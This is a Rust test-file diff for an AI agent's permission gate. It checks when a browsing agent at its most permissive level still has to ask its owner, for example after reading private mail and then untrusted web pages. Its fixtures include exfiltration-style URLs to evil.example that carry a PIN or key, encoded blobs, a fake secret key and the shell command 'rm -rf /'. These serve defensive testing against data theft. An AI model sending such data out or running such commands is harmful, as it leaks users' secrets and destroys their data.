@@ -1,11 +1,11 @@
-//! The Full ("Tam") level for an owner-started run: it browses after reading a page without a
-//! card, and the hard stops and the data-shaped calls still ask.
+//! The Full ("Tam") level for an owner-started run: it browses the sites the owner named without
+//! a card, and everything that could carry the run's reading out to somewhere else still asks.
 
 use std::sync::Arc;
 use std::sync::atomic::{AtomicUsize, Ordering};
 
 use permission_engine::Policy;
-use protocol::{Event, PermissionCategory};
+use protocol::{Event, InitiatorKind, PermissionCategory};
 use serde_json::{Value, json};
 use tool_registry::{ContentClass, Effect};
 
@@ -16,33 +16,64 @@ use crate::tests::{
 const FULL: &str = "[permissions]\npreset = \"full\"\n";
 const BALANCED: &str = "[permissions]\npreset = \"approve-destructive\"\n";
 const OWNER_SAYS: &str = "webioo.com.tr adresine gir, sitede insan gibi gezin";
+/// What the owner's site says (public web content: untrusted, not private).
+const PAGE: &str = "Webioo web tasarim ajansi. Iletisim, hakkimizda, referanslar, seo hizmetleri.";
+/// What the owner's private mail says: this is what must not leave.
+const MAIL: &str = "From: bank. Your pin is 998877 and the iban ends in tail4242.";
+/// The owner's task for the multi-site scenario: details he typed for the bot to use.
+const SEO_SAYS: &str = "sign up to several SEO-relevant sites with these company details and do whatever is needed:     Acme Widgets GmbH, info@acme-widgets.example, +49 30 1234567, we build widgets in Berlin";
+const OWNERS_ORIGIN: &str = "https://webioo.com.tr:443";
 
 /// A built-in tool with the content class the real tool has.
-fn real(name: &str, effect: Effect, category: PermissionCategory) -> Arc<TestTool> {
-    Arc::new(with_class(
+fn real(name: &str, effect: Effect, category: PermissionCategory, output: &str) -> TestTool {
+    with_class(
         name,
         effect,
         category,
         builtin_tools::classify(name).expect("a built-in tool"),
-        "ok",
-    ))
+        output,
+    )
 }
 
-/// The managed browser's tools and the shell, as the daemon registers them.
-fn browser_tools() -> Vec<Arc<TestTool>> {
+/// How a run starts and what it sees.
+struct Case {
+    preset: &'static str,
+    policy: Policy,
+    /// The `source` tag of the owner's message (`owner` = typed in the desktop app).
+    source: &'static str,
+    /// Start the run through this initiator instead of an owner message.
+    initiator: Option<InitiatorKind>,
+    /// The origin the browser reports on page actions.
+    origin: Option<&'static str>,
+    /// A non-browser tool (mail, a file) put the owner's PRIVATE content in front of the model.
+    private_first: bool,
+    /// What the owner typed to start the run.
+    said: &'static str,
+}
+
+impl Case {
+    fn full() -> Case {
+        Case {
+            preset: FULL,
+            policy: Policy::full(),
+            source: "owner",
+            initiator: None,
+            origin: Some(OWNERS_ORIGIN),
+            private_first: false,
+            said: OWNER_SAYS,
+        }
+    }
+}
+
+/// The managed browser's tools, a shell, a payment and a mail read, as the daemon registers them.
+fn tools(origin: Option<&str>) -> Vec<Arc<TestTool>> {
     let b = PermissionCategory::Browser;
-    let snapshot = with_class(
-        "browser_snapshot",
-        Effect::Read,
-        b,
-        builtin_tools::classify("browser_snapshot").unwrap(),
-        "page text",
-    );
-    // The browser reports the site it is on.
-    *snapshot.page_origin.lock() = Some("https://webioo.com.tr:443".to_owned());
-    let mut tools = vec![Arc::new(snapshot)];
+    let mut all = vec![
+        real("browser_snapshot", Effect::Read, b, PAGE),
+        real("browser_open", Effect::Write, b, PAGE),
+        real("browser_scroll", Effect::Read, b, "scrolled"),
+    ];
     for name in [
-        "browser_open",
         "browser_click",
         "browser_fill",
         "browser_select",
@@ -50,22 +81,36 @@ fn browser_tools() -> Vec<Arc<TestTool>> {
         "browser_tabs",
         "browser_eval",
     ] {
-        tools.push(real(name, Effect::Write, b));
+        all.push(real(name, Effect::Write, b, "ok"));
     }
-    tools.push(real(
+    all.push(real(
         "shell_run",
         Effect::Destructive,
         PermissionCategory::Shell,
+        "ok",
     ));
     // a payment: the Money floor
-    tools.push(Arc::new(with_class(
+    all.push(with_class(
         "pay",
         Effect::Destructive,
         PermissionCategory::Money,
         ContentClass::none(),
         "paid",
-    )));
-    tools
+    ));
+    // a mail or file read by a tool that is not the browser
+    all.push(with_class(
+        "mail_read",
+        Effect::Read,
+        PermissionCategory::Fs,
+        ContentClass::untrusted_private(),
+        MAIL,
+    ));
+    all.into_iter()
+        .map(|tool| {
+            *tool.page_origin.lock() = origin.map(str::to_owned);
+            Arc::new(tool)
+        })
+        .collect()
 }
 
 /// A tool that always asks, whatever the level (a send, a secret fill).
@@ -119,34 +164,17 @@ impl tool_registry::Tool for AlwaysAsks {
     }
 }
 
-/// How a run was started and at which level.
-struct Setup {
-    preset: &'static str,
-    policy: Policy,
-    /// The `source` tag of the owner's message (`owner` = typed in the desktop app).
-    source: &'static str,
-}
-
-impl Setup {
-    fn full() -> Setup {
-        Setup {
-            preset: FULL,
-            policy: Policy::full(),
-            source: "owner",
-        }
-    }
-}
-
-/// Runs: open the owner's site (a clean run), read it (the run is now tainted), then `later`
-/// calls in order. Returns the tool name of the first card the run asked, or `None` when the run
-/// finished without one. A card is cancelled, never answered.
-async fn first_card(
-    setup_: Setup,
+/// Runs: open the owner's site (a clean run), read it (the run is now tainted), optionally read
+/// a mail, then `later` calls in order. Returns how many `browser_open` calls ran after the
+/// first one and the tool name of the first card, or `None` when the run finished without one.
+/// A card is cancelled, never answered.
+async fn run(
+    case: Case,
     extra: &[Arc<AlwaysAsks>],
     later: &[(&str, Value)],
-) -> Option<String> {
+) -> (usize, Option<String>) {
     let env = setup();
-    let tools = browser_tools();
+    let all = tools(case.origin);
     let mut script = vec![
         calls(&[(
             "o",
@@ -155,13 +183,16 @@ async fn first_card(
         )]),
         calls(&[("s", "browser_snapshot", json!({}))]),
     ];
+    if case.private_first {
+        script.push(calls(&[("m", "mail_read", json!({"path": "inbox"}))]));
+    }
     for (i, (name, input)) in later.iter().enumerate() {
         script.push(calls(&[(format!("c{i}").as_str(), name, input.clone())]));
     }
     script.push(text("done"));
     let fake = Fake::new(script);
     // a tool of the same name in `extra` replaces the plain one
-    let refs: Vec<&Arc<TestTool>> = tools
+    let refs: Vec<&Arc<TestTool>> = all
         .iter()
         .filter(|tool| extra.iter().all(|e| e.spec.name != tool.spec.name))
         .map(t)
@@ -171,29 +202,34 @@ async fn first_card(
         env.bot,
         &fake,
         &refs,
-        profile(setup_.preset),
-        cfg(setup_.policy),
+        profile(case.preset),
+        cfg(case.policy),
     );
     for tool in extra {
         lp.tool_registry()
             .register(Arc::clone(tool) as Arc<dyn tool_registry::Tool>);
     }
     let mut rx = lp.subscribe();
-    let delivery = lp
-        .send_user_message_from(
-            env.chat,
-            OWNER_SAYS,
-            crate::MessageMode::Steer,
-            setup_.source,
-        )
-        .unwrap();
-    let crate::Delivery::NewTurn(run) = delivery else {
-        unreachable!()
+    let run = if let Some(kind) = case.initiator {
+        lp.run_turn_as(env.chat, case.said, kind).unwrap()
+    } else {
+        let crate::Delivery::NewTurn(run) = lp
+            .send_user_message_from(env.chat, case.said, crate::MessageMode::Steer, case.source)
+            .unwrap()
+        else {
+            unreachable!()
+        };
+        run
     };
     let event = until(&mut rx, |e| {
         matches!(e, Event::ApprovalNeeded(_) | Event::RunFinished(_))
     })
     .await;
+    let opens = all
+        .iter()
+        .find(|tool| tool.spec.name == "browser_open")
+        .map_or(0, |tool| tool.count.load(Ordering::SeqCst));
+    let ran = opens.saturating_sub(1);
     if let Event::ApprovalNeeded(card) = event {
         let name = card.tool_name.clone();
         lp.cancel(run).unwrap();
@@ -204,73 +240,278 @@ async fn first_card(
                 "{name} ran after asking"
             );
         }
-        return Some(name);
+        return (ran, Some(name));
     }
-    None
+    (ran, None)
+}
+
+async fn card(case: Case, later: &[(&str, Value)]) -> Option<String> {
+    run(case, &[], later).await.1
 }
 
 #[tokio::test]
-async fn a_full_owner_run_browses_deep_pages_forms_and_new_sites_after_reading_a_page() {
+async fn the_owners_real_scenario_deep_pages_of_the_named_site_never_ask() {
     let later = [
-        // a deep page of the site it is on, then one with an ordinary query string
         (
             "browser_open",
-            json!({"url": "https://webioo.com.tr/referanslarimiz"}),
+            json!({"url": "https://webioo.com.tr/iletisim"}),
         ),
         (
             "browser_open",
-            json!({"url": "https://webioo.com.tr/iletisim?ref=menu&page=2"}),
-        ),
-        // a NEW public site, deep and with a short query
-        (
-            "browser_open",
-            json!({"url": "https://other.example/products/shoes"}),
+            json!({"url": "https://webioo.com.tr/hakkimizda"}),
         ),
         (
             "browser_open",
-            json!({"url": "https://other.example/search?q=web+tasarim"}),
+            json!({"url": "https://webioo.com.tr/referanslar?page=2&sort=new"}),
         ),
-        // a person types into a form, picks an option and presses a key
+        (
+            "browser_open",
+            json!({"url": "https://www.webioo.com.tr/blog/2024-yilin-en-iyi-10-urunu"}),
+        ),
+        ("browser_scroll", json!({"direction": "down"})),
+        ("browser_click", json!({"ref": "e7"})),
+        // the site's own form, with a longer message than a stranger's form could get
         (
             "browser_fill",
-            json!({"ref": "e5", "text": "Merhaba, fiyat teklifi almak istiyorum."}),
+            json!({"ref": "e5", "text": "Merhaba, web sitemiz icin fiyat teklifi almak istiyoruz, lutfen donus yapin."}),
         ),
         ("browser_select", json!({"ref": "e6", "value": "Istanbul"})),
         ("browser_press", json!({"key": "Enter"})),
-        ("browser_click", json!({"ref": "e7"})),
         (
             "browser_tabs",
-            json!({"action": "new", "url": "https://webioo.com.tr/hakkimizda"}),
+            json!({"action": "new", "url": "https://webioo.com.tr/iletisim"}),
         ),
     ];
-    assert_eq!(first_card(Setup::full(), &[], &later).await, None);
+    assert_eq!(card(Case::full(), &later).await, None);
+    // the same after a mail was read: the owner's own site still never asks
+    assert_eq!(card(private(), &later[..4]).await, None);
+}
+
+/// A run that first read the owner's private mail (a tool that is not the browser).
+fn private() -> Case {
+    let mut c = Case::full();
+    c.private_first = true;
+    c
+}
+
+#[tokio::test]
+async fn the_owners_multi_site_scenario_signs_up_on_new_sites_without_a_card() {
+    // "sign up to several SEO sites with these details": five NEW origins, forms with the
+    // details he typed (a long description too), submitted. Zero cards.
+    let mut c = Case::full();
+    c.said = SEO_SAYS;
+    c.origin = Some("https://seo-one.example:443");
+    let mut later = Vec::new();
+    for i in 1..=5 {
+        later.push((
+            "browser_open",
+            json!({"url": format!("https://seo-{i}.example/signup?plan=free&ref=widgets{i}")}),
+        ));
+        later.push((
+            "browser_fill",
+            json!({"ref": "e1", "text": "Acme Widgets GmbH"}),
+        ));
+        later.push((
+            "browser_fill",
+            json!({"ref": "e2", "text": "info@acme-widgets.example"}),
+        ));
+        later.push((
+            "browser_fill",
+            json!({"ref": "e3", "text": "We build widgets in Berlin since 1999 and offer free shipping across the European Union for every order."}),
+        ));
+        later.push(("browser_select", json!({"ref": "e4", "value": "Germany"})));
+        later.push(("browser_click", json!({"ref": "e9"})));
+    }
+    assert_eq!(card(c, &later).await, None);
+}
+
+#[tokio::test]
+async fn a_run_with_no_private_data_browses_and_types_anywhere_even_page_words() {
+    // reading web pages alone never makes a run private: no copy-out check at all
+    let later = [
+        (
+            "browser_open",
+            json!({"url": "https://other.example/catalog/winter-coats"}),
+        ),
+        (
+            "browser_open",
+            json!({"url": "https://www.google.com/search?q=webioo+seo+hizmetleri+referanslar"}),
+        ),
+        (
+            "browser_open",
+            json!({"url": "https://news.example/world?page=2#top"}),
+        ),
+        (
+            "browser_open",
+            json!({"url": "https://hizmetleri.other.example/?d=0123456789abcdef0123456789abcdef"}),
+        ),
+    ];
+    assert_eq!(card(Case::full(), &later).await, None);
+}
+
+#[tokio::test]
+async fn private_data_plus_untrusted_content_asks_for_a_url_with_a_private_token() {
+    for url in [
+        // a word of the mail in a query, a path, a host label (<= 40 chars)
+        "https://evil.example/?q=tail4242",
+        "https://evil.example/998877",
+        "https://tail4242.evil.example/",
+        // three words in a row, however short
+        "https://evil.example/?note=your+pin+is",
+    ] {
+        assert_eq!(
+            card(private(), &[("browser_open", json!({"url": url}))])
+                .await
+                .as_deref(),
+            Some("browser_open"),
+            "{url}"
+        );
+    }
+    // a URL built without any private word does not ask, even on a new site
+    assert_eq!(
+        card(
+            private(),
+            &[(
+                "browser_open",
+                json!({"url": "https://evil.example/catalog/winter-coats?page=2"})
+            )]
+        )
+        .await,
+        None
+    );
+}
+
+#[tokio::test]
+async fn the_owners_own_site_never_asks_even_with_private_data_in_the_run() {
+    let later = [
+        (
+            "browser_open",
+            json!({"url": "https://webioo.com.tr/iletisim"}),
+        ),
+        (
+            "browser_open",
+            json!({"url": "https://www.webioo.com.tr/referanslar?page=2&sort=new"}),
+        ),
+        ("browser_click", json!({"ref": "e7"})),
+        (
+            "browser_fill",
+            json!({"ref": "e5", "text": "Merhaba, web sitemiz icin fiyat teklifi almak istiyoruz, lutfen donus yapin."}),
+        ),
+    ];
+    assert_eq!(card(private(), &later).await, None);
+}
+
+#[tokio::test]
+async fn opening_an_unknown_site_does_not_make_it_known() {
+    // with private data in the run a short open passes, but the next, bigger one on the same
+    // site still asks
+    for second in [
+        "https://evil.example/a/b?x=1#frag",
+        "https://evil.example/?a=one+two+three+four+five+six+seven&b=eight+nine+ten+eleven+twelve&c=thirteen+fourteen+fifteen&d=sixteen+seventeen+eighteen&e=nineteen+twenty+thirty",
+        "https://evil.example/?a=1&b=2&c=3&d=4&e=5&f=6&g=7&h=8&i=9&j=10&k=11&l=12&m=13",
+    ] {
+        let (ran, card) = run(
+            private(),
+            &[],
+            &[
+                ("browser_open", json!({"url": "https://evil.example/a"})),
+                ("browser_open", json!({"url": second})),
+            ],
+        )
+        .await;
+        assert_eq!(
+            (ran, card.as_deref()),
+            (1, Some("browser_open")),
+            "{second}"
+        );
+    }
+}
+
+#[tokio::test]
+async fn chunks_over_the_budget_ask_when_the_run_holds_private_data() {
+    let later: Vec<(&str, Value)> = (0..14)
+        .map(|i| {
+            (
+                "browser_open",
+                json!({"url": format!("https://site{i}.example/catalog/item{i}?color=red&size=large&sort=price{i}&page={i}")}),
+            )
+        })
+        .collect();
+    let (ran, card) = run(private(), &[], &later).await;
+    assert_eq!(card.as_deref(), Some("browser_open"));
+    assert!((2..14).contains(&ran), "the budget stopped it after {ran}");
+    // the same calls in a run with no private data never ask
+    assert_eq!(card_for_clean(&later).await, None);
+}
+
+async fn card_for_clean(later: &[(&str, Value)]) -> Option<String> {
+    run(Case::full(), &[], later).await.1
+}
+
+#[tokio::test]
+async fn a_form_on_a_stranger_page_asks_for_private_or_long_text_only_with_private_data() {
+    let stranger = |private_first: bool| {
+        let mut c = Case::full();
+        c.private_first = private_first;
+        c.origin = Some("https://evil.example:443");
+        c
+    };
+    for text in [
+        "tail4242",
+        "an ordinary sentence of more than forty characters in a form",
+    ] {
+        assert_eq!(
+            card(
+                stranger(true),
+                &[("browser_fill", json!({"ref": "e5", "text": text}))]
+            )
+            .await
+            .as_deref(),
+            Some("browser_fill"),
+            "{text}"
+        );
+        // no private data in the run: the owner's details go into any form
+        assert_eq!(
+            card(
+                stranger(false),
+                &[("browser_fill", json!({"ref": "e5", "text": text}))]
+            )
+            .await,
+            None,
+            "{text}"
+        );
+    }
+    // a short field with nothing private in it passes even in a private run
+    assert_eq!(
+        card(
+            stranger(true),
+            &[("browser_fill", json!({"ref": "e5", "text": "ali"}))]
+        )
+        .await,
+        None
+    );
 }
 
 #[tokio::test]
 async fn a_full_owner_run_still_asks_for_a_call_that_carries_data_out() {
+    // data-shaped addresses to a new site, when the run holds private data
+    for url in [
+        "https://other.example/c2VjcmV0LXRva2VuLWZyb20tdGhlLXBhZ2UtYWJjZGVmZ2hpams",
+        "https://other.example/?d=0123456789abcdef0123456789abcdef",
+        "https://other.example/?k=sk-live-AbCdEfGhIjKlMnOp",
+        "https://other.example/page#anything",
+        "https://c2VjcmV0LXRva2VuLWZyb20tdGhlLXBhZ2U.other.example/",
+    ] {
+        assert_eq!(
+            card(private(), &[("browser_open", json!({"url": url}))])
+                .await
+                .as_deref(),
+            Some("browser_open"),
+            "{url}"
+        );
+    }
     for (name, input) in [
-        // an encoded blob, a hex digest or a key in a path, a query or a new site's fragment
-        (
-            "browser_open",
-            json!({"url": "https://webioo.com.tr/c2VjcmV0LXRva2VuLWZyb20tdGhlLXBhZ2UtYWJjZGVmZ2hpams"}),
-        ),
-        (
-            "browser_open",
-            json!({"url": "https://other.example/?d=0123456789abcdef0123456789abcdef"}),
-        ),
-        (
-            "browser_open",
-            json!({"url": "https://other.example/?k=sk-live-AbCdEfGhIjKlMnOp"}),
-        ),
-        (
-            "browser_open",
-            json!({"url": "https://other.example/page#anything"}),
-        ),
-        (
-            "browser_open",
-            json!({"url": "https://c2VjcmV0LXRva2VuLWZyb20tdGhlLXBhZ2U.other.example/"}),
-        ),
-        // text a form should not get
+        // text a form should not get, in any run, on any site
         (
             "browser_fill",
             json!({"ref": "e5", "text": "sk-live-AbCdEfGhIjKlMnOp"}),
@@ -294,7 +535,7 @@ async fn a_full_owner_run_still_asks_for_a_call_that_carries_data_out() {
         ),
     ] {
         assert_eq!(
-            first_card(Setup::full(), &[], &[(name, input.clone())])
+            card(Case::full(), &[(name, input.clone())])
                 .await
                 .as_deref(),
             Some(name),
@@ -309,7 +550,7 @@ async fn the_hard_stops_still_ask_in_full_after_a_page_was_read() {
     let fill = AlwaysAsks::new("browser_fill", PermissionCategory::Browser);
     // money is a floor, a send always asks, an owner-stored secret is never typed silently
     assert_eq!(
-        first_card(Setup::full(), &[], &[("pay", json!({"amount": 5}))])
+        card(Case::full(), &[("pay", json!({"amount": 5}))])
             .await
             .as_deref(),
         Some("pay")
@@ -320,13 +561,10 @@ async fn the_hard_stops_still_ask_in_full_after_a_page_was_read() {
     ] {
         let name = tool.spec.name.clone();
         assert_eq!(
-            first_card(
-                Setup::full(),
-                &[Arc::clone(tool)],
-                &[(name.as_str(), input)]
-            )
-            .await
-            .as_deref(),
+            run(Case::full(), &[Arc::clone(tool)], &[(name.as_str(), input)])
+                .await
+                .1
+                .as_deref(),
             Some(name.as_str())
         );
     }
@@ -334,13 +572,9 @@ async fn the_hard_stops_still_ask_in_full_after_a_page_was_read() {
     // after a page was read keep asking: a page must not choose the command
     for cmd in ["rm -rf /", "ls"] {
         assert_eq!(
-            first_card(
-                Setup::full(),
-                &[],
-                &[("shell_run", json!({"command": cmd}))]
-            )
-            .await
-            .as_deref(),
+            card(Case::full(), &[("shell_run", json!({"command": cmd}))])
+                .await
+                .as_deref(),
             Some("shell_run"),
             "{cmd}"
         );
@@ -351,29 +585,33 @@ async fn the_hard_stops_still_ask_in_full_after_a_page_was_read() {
 async fn other_levels_and_runs_that_are_not_owner_started_keep_the_gate() {
     let deep = [(
         "browser_open",
-        json!({"url": "https://other.example/products/shoes"}),
+        json!({"url": "https://webioo.com.tr/iletisim"}),
     )];
     // Normal ("approve destructive") level asks, as before
-    let balanced = Setup {
-        preset: BALANCED,
-        policy: Policy::approve_destructive(),
-        source: "owner",
-    };
-    assert!(first_card(balanced, &[], &deep).await.is_some());
+    let mut balanced = Case::full();
+    balanced.preset = BALANCED;
+    balanced.policy = Policy::approve_destructive();
+    assert!(card(balanced, &deep).await.is_some());
     // a Full policy on a bot that never chose the Full preset (a custom level) asks
-    let custom = Setup {
-        preset: "",
-        policy: Policy::full(),
-        source: "owner",
-    };
-    assert!(first_card(custom, &[], &deep).await.is_some());
+    let mut custom = Case::full();
+    custom.preset = "";
+    assert!(card(custom, &deep).await.is_some());
     // a Full bot whose message did not come from the owner's desktop asks
     for source in ["telegram", "api", "webhook"] {
-        let other = Setup {
-            preset: FULL,
-            policy: Policy::full(),
-            source,
-        };
-        assert!(first_card(other, &[], &deep).await.is_some(), "{source}");
+        let mut other = Case::full();
+        other.source = source;
+        assert!(card(other, &deep).await.is_some(), "{source}");
+    }
+    // and so does a run another initiator started, whatever its message says
+    for kind in [
+        InitiatorKind::ExternalAgent,
+        InitiatorKind::ExternalSchedule,
+        InitiatorKind::Channel,
+        InitiatorKind::Routine,
+        InitiatorKind::Schedule,
+    ] {
+        let mut other = Case::full();
+        other.initiator = Some(kind);
+        assert!(card(other, &deep).await.is_some(), "{kind:?}");
     }
 }
